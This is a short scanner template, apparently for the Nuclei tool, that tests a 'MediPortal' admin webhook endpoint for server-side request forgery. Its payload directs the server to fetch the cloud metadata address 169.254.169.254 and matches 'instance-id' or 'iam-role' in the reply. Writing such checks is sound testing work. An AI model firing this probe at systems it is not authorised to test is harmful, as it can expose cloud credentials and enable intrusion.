id: mediportal-webhook-ssrf

info:
  name: MediPortal Admin Webhook SSRF
  author: edge-resilience-lab
  severity: high
  description: Server-Side Request Forgery test via Webhook Tester.

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/v1/diagnostics/webhook"
    headers:
      Content-Type: application/json
    body: '{"url": "http://169.254.169.254/latest/meta-data/"}'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "instance-id"
          - "iam-role"
        part: body
      - type: status
        status:
          - 200
